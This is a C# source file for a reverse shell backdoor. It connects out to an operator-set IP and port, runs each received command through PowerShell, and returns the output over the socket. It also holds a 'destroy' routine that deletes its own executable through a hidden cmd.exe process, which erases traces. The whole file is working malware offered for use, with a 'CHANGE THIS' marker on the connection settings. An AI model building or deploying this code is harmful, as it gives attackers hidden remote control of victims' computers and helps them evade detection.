using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.IO;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;

namespace ClientSocket
{
    internal class ClientShell
    {

        public string GetResult(string cmd)
        {
            string result = null;

            RunspaceConfiguration rc = RunspaceConfiguration.Create();
            Runspace r = RunspaceFactory.CreateRunspace( rc );
            r.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = r;
            ps.AddScript( cmd );

            StringWriter sw = new StringWriter();

            Collection<PSObject> po = ps.Invoke();
            foreach ( PSObject p in po ) 
            {
                sw.WriteLine( p.ToString() );
            }
            result= sw.ToString();
            if (result == "")
                return "Command not recognized";
            else
                return result;
        }

        public void Destroy()
        {
            // Wait 3 seconds then delete the executable
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });

            Environment.Exit(1);
        }
        static void Main(string[] args)
        {
            // CHANGE THIS
            string IP_ADDRESS = "127.0.0.1";
            int PORT = 1234;

            ClientShell program = new ClientShell();

            int BUFFER_SIZE = 2 * 1024;
            IPAddress serverIP = IPAddress.Parse(IP_ADDRESS);
            IPEndPoint ipe = new IPEndPoint(serverIP, PORT);

            Socket cs = new Socket(serverIP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            int failedAttempts = 0;
            do
            {
                try
                {
                    cs.Connect(ipe);
                }
                catch (Exception ex)
                {
                    failedAttempts++;
                    //Console.WriteLine("Failed to connect. {0}", failedAttempts);

                    System.Threading.Thread.Sleep(30 * 1000);
                }
            } while (failedAttempts < 5 && !cs.Connected);

            if (!cs.Connected)
                Environment.Exit(1);


            string msg, result;
            byte[] buffer = new byte[BUFFER_SIZE];

            do
            {
                Array.Clear(buffer, 0, BUFFER_SIZE);
                cs.Receive(buffer);
                msg = Encoding.ASCII.GetString(buffer).TrimEnd('\0');
                //Console.WriteLine("[+] Server says: {0}", msg);

                if (msg == "destroy")
                {
                    program.Destroy();
                    result = program.GetResult("ls");
                    cs.Send(Encoding.ASCII.GetBytes(result));
                }
                else
                {
                    result = program.GetResult(msg);
                    cs.Send(Encoding.ASCII.GetBytes(result));
                }
            } while (msg != "quit");


            cs.Close();
        }
    }
}
